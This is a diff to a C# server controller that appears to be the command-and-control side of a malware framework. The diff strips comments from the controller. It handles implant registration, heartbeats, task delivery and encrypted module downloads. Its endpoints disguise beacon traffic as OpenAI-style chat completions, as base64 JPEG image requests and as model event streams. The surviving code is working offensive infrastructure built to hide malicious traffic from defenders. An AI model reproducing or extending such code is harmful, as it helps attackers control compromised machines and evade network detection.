@@ -18,8 +18,6 @@ public class AgentCommsController : ControllerBase
     internal static readonly string BuildsDir = ResolveBuildsDir();
 
     /// <summary>
-    /// 构建产物目录：优先 LIBRA_BUILDS_DIR 环境变量（公网发布部署用绝对路径），
-    /// 否则回退 dev 相对路径（bin/Debug/net10.0 上跳四级到仓库根 build-output）。
     /// </summary>
     private static string ResolveBuildsDir()
     {
@@ -36,9 +34,6 @@ public class AgentCommsController : ControllerBase
     private readonly BeaconSettings _beaconSettings;
     private static readonly System.Text.Json.JsonSerializerOptions JsonOpts = new(System.Text.Json.JsonSerializerDefaults.Web)
     {
-        // 枚举必须输出 camelCase 字符串（agent 协议与 Rust serde 对齐）：
-        // Rust 侧枚举带 rename_all="camelCase"（pending/completed/generic…），
-        // 数字或 PascalCase 都会导致 AgentTask 反序列化失败。
         Converters = { new System.Text.Json.Serialization.JsonStringEnumConverter(System.Text.Json.JsonNamingPolicy.CamelCase) }
     };
     private static string J(object v) => System.Text.Json.JsonSerializer.Serialize(v, JsonOpts);
@@ -163,21 +158,13 @@ public class AgentCommsController : ControllerBase
         }
         catch (Exception ex)
         {
-            // 广播失败不阻断注册流程。
             _ = ex;
         }
-        // AI 事件订阅：Agent 上线 → Justitia 生成提醒并送达订阅目标。
         _ = _aiEventNotifier.NotifyAsync(agentId, hostname, ipAddress, AiEventNotifier.EvtAgentOnline);
     }
 
     // ══════════════════════════════════════════════════════════════════
-    // 单入口内部路由（流量伪装 Phase 2）
     //
-    // 所有 beacon 流量经 BeaconEntryMiddleware 重写到本端点：
-    //   POST <entry_path>/<随机业务后缀>
-    //   body = { dataKey: 密文, tsKey: ts, randKey: 随机, signKey: HMAC, tokenKey: sid }
-    // 密文内是 BeaconEnvelope{op, id, data}，按 op 分发：
-    //   reg=注册(预会话密钥) / hb=心跳 / res=结果 / mod=模块下载
     // ══════════════════════════════════════════════════════════════════
 
     [HttpPost("handle")]
@@ -189,13 +176,11 @@ public class AgentCommsController : ControllerBase
         var profile = await _commsService.GetActiveProfileAsync();
         var (dataKey, tsKey, randKey, signKey, tokenKey) = TransformKeys(profile);
 
-        // 1) 壳解析
         if (!el.TryGetProperty(dataKey, out var dProp) || dProp.GetString() is not string cipherB64)
             return BadRequest(new { error = "bad envelope" });
         var sid = el.TryGetProperty(tokenKey, out var sidProp) ? sidProp.GetString() : null;
         var tsStr = el.TryGetProperty(tsKey, out var tsProp) ? tsProp.ToString() : "";
 
-        // 2) 假签名宽松校验（仅记录，不拒绝——避免 secret 更换导致失联）
         if (!string.IsNullOrEmpty(signKey) && el.TryGetProperty(signKey, out var sigProp) && sigProp.GetString() is string providedSign)
         {
             var secret = _beaconSettings.Secret;
@@ -204,12 +189,10 @@ public class AgentCommsController : ControllerBase
                 var expected = HmacHex(secret, $"{tsStr}|{cipherB64}");
                 if (!string.Equals(expected, providedSign, StringComparison.OrdinalIgnoreCase))
                 {
-                    // HMAC 不匹配：宽松处理（记录）
                 }
             }
         }
 
-        // 3) 密钥选择：sid → 会话密钥；否则尝试预会话密钥（注册）
         byte[]? key = null;
         string? agentId = null;
         if (!string.IsNullOrEmpty(sid) &&
@@ -241,7 +224,6 @@ public class AgentCommsController : ControllerBase
             return Unauthorized(new { error = "decrypt failed" });
         }
 
-        // 4) 信封解析（camelCase：op/id/data）
         BeaconEnvelope? env;
         try
         {
@@ -259,7 +241,6 @@ public class AgentCommsController : ControllerBase
 
         var bytesReceived = Request.ContentLength ?? 0;
 
-        // 5) 分发
         switch (env.Op)
         {
             case "reg":
@@ -285,16 +266,12 @@ public class AgentCommsController : ControllerBase
         }
     }
 
-    /// AI 通道端点（v1/chat/completions 伪装）：请求体为 chat.completions 风格，
-    /// 密文在 messages[0].content，会话标识在 user 字段（随机会话 token）。
-    /// 响应为 text/event-stream，密文分块放在 delta.content，最后 [DONE]。
     [HttpPost("ai")]
     public async Task<IActionResult> AiChannel([FromBody] JsonElement? body)
     {
         if (body is not { } el)
             return BadRequest(new { error = "invalid body" });
 
-        // 1) 解析 chat 请求
         if (!el.TryGetProperty("messages", out var messages) ||
             messages.ValueKind != JsonValueKind.Array ||
             messages.GetArrayLength() == 0)
@@ -304,14 +281,12 @@ public class AgentCommsController : ControllerBase
         var first = messages[0];
         if (!first.TryGetProperty("content", out var contentProp) || contentProp.GetString() is not string rawContent)
             return BadRequest(new { error = "invalid content" });
-        // 伪装：content 以 data:image/jpeg;base64, 开头（AI 图片分析请求），剥前缀取密文
         var cipherB64 = rawContent;
         const string imagePrefix = "data:image/jpeg;base64,";
         if (rawContent.StartsWith(imagePrefix, StringComparison.OrdinalIgnoreCase))
             cipherB64 = rawContent[imagePrefix.Length..];
         var userId = el.TryGetProperty("user", out var userProp) ? userProp.GetString() : null;
 
-        // 2) 密钥选择：user 字段（会话 token）→ 会话密钥；否则预会话密钥（注册）
         byte[]? key = null;
         string? agentId = null;
         if (!string.IsNullOrEmpty(userId) &&
@@ -343,7 +318,6 @@ public class AgentCommsController : ControllerBase
             return Unauthorized(new { error = "decrypt failed" });
         }
 
-        // 3) 信封解析
         BeaconEnvelope? env;
         try
         {
@@ -362,20 +336,17 @@ public class AgentCommsController : ControllerBase
         var bytesReceived = Request.ContentLength ?? 0;
         var profile = await _commsService.GetActiveProfileAsync();
 
-        // 4) 分发 → 响应明文
         string? responsePlain = null;
         switch (env.Op)
         {
             case "reg":
                 {
-                    // 注册走旧端点（明文/密文），AI 通道不承载注册
                     return BadRequest(new { error = "register via beacon endpoint" });
                 }
             case "hb":
                 {
                     if (agentId == null || key == null)
                         return Unauthorized(new { error = "session not established" });
-                    // 重放保护
                     try
                     {
                         using var hb = JsonDocument.Parse(env.Data);
@@ -453,7 +424,6 @@ public class AgentCommsController : ControllerBase
                         return NotFound(new { error = "module not found" });
 
                     var bytes = System.IO.File.ReadAllBytes(modulePath);
-                    // 密文内容为 base64 的模块二进制
                     responsePlain = Convert.ToBase64String(bytes);
                     break;
                 }
@@ -464,7 +434,6 @@ public class AgentCommsController : ControllerBase
         if (responsePlain == null)
             return BadRequest(new { error = "no response" });
 
-        // 5) SSE 响应：密文分块（≤60KB base64）放入 delta.content
         var encrypted = CryptoHelper.EncryptPayload(responsePlain, key!);
         var chunks = ChunkString(encrypted, 60 * 1024);
         var sb = new StringBuilder();
@@ -494,11 +463,6 @@ public class AgentCommsController : ControllerBase
     }
 
     /// <summary>
-    /// SSE 任务事件流（伪装为模型事件流：GET /api/v1/models/events?channel=，
-    /// 由 BeaconEntryMiddleware 重写到本端点）。服务端挂起连接，任务到达时
-    /// 主动推送（AES-GCM 加密信封：data: &lt;b64(nonce||tag||ct)&gt;），
-    /// 30s 注释 keepalive。连接建立时先补发一次 pending 任务。
-    /// agent 以此替代心跳轮询；心跳降为低频兜底。
     /// </summary>
     [HttpGet("/api/beacon/events")]
     public async Task Events(string? channel, CancellationToken ct)
@@ -518,7 +482,6 @@ public class AgentCommsController : ControllerBase
 
         var queue = _eventHub.Subscribe(agentId);
         var abort = HttpContext.RequestAborted;
-        // SSE 通道流量计入统计（下行字节，连接结束时 flush）
         long sseBytesSent = 0;
         var hostname = (await _agentService.GetByIdAsync(agentId, abort))?.Hostname ?? "unknown";
 
@@ -531,7 +494,6 @@ public class AgentCommsController : ControllerBase
             sseBytesSent += Encoding.UTF8.GetByteCount(line);
         }
 
-        // 连接即同步：pending 任务（避免竞态，心跳兜底）
         try
         {
             var pending = await _taskService.GetNextPendingForAgentAsync(agentId, abort);
@@ -561,7 +523,6 @@ public class AgentCommsController : ControllerBase
                 }
                 else
                 {
-                    // keepalive 注释行：刷新代理（nginx proxy_read_timeout）空闲超时
                     const string ping = ": ping\n\n";
                     await Response.WriteAsync(ping, abort);
                     await Response.Body.FlushAsync(abort);
@@ -622,7 +583,6 @@ public class AgentCommsController : ControllerBase
     private async Task<IActionResult> HandleHbAsync(
         string agentId, string hbData, byte[] key, long bytesReceived, IMalleableProfile profile)
     {
-        // 重放保护：ts 与当前时间差 > 120s 拒绝
         try
         {
             using var hb = JsonDocument.Parse(hbData);
@@ -709,7 +669,6 @@ public class AgentCommsController : ControllerBase
             return NotFound(new { error = "module not found" });
 
         var bytes = System.IO.File.ReadAllBytes(modulePath);
-        // 响应壳：密文内容为 base64 的模块二进制
         var encrypted = CryptoHelper.EncryptPayload(Convert.ToBase64String(bytes), key);
         var (dataKey, _, _, _, _) = TransformKeys(profile);
         return Ok(new Dictionary<string, string> { [dataKey] = encrypted });
@@ -769,7 +728,6 @@ public class AgentCommsController : ControllerBase
                 authPrefix = c.AuthPrefix
             };
         }
-        // DefaultProfile 固定值
         return new
         {
             entryPath = "/api",
@@ -1034,8 +992,6 @@ public class AgentCommsController : ControllerBase
     /// server encrypts the core AES key with it. No private key is ever embedded
     /// in the agent binary.
     ///
-    /// 旧端点（兼容旧 loader）：不发放 core.bin 下载凭证；新 loader 走
-    /// /api/v1/auth/token（同样密钥协商 + 一次性下载凭证，防 buildId 枚举拉取）。
     /// </summary>
     [HttpPost("core-key")]
     public IActionResult CoreKey([FromBody] CoreKeyRequest request)
@@ -1074,13 +1030,9 @@ public class CoreKeyRequest
     public string? BeaconSecret { get; set; }
 }
 
-/// <summary>密文内部的路由信封（单入口模式）：op 决定服务端分发。</summary>
 public class BeaconEnvelope
 {
-    /// <summary>reg=注册 / hb=心跳 / res=结果 / mod=模块下载</summary>
     public string Op { get; set; } = string.Empty;
-    /// <summary>会话 token（reg 时为注册数据）</summary>
     public string Id { get; set; } = string.Empty;
-    /// <summary>业务数据（JSON 字符串）</summary>
     public string Data { get; set; } = string.Empty;
 }
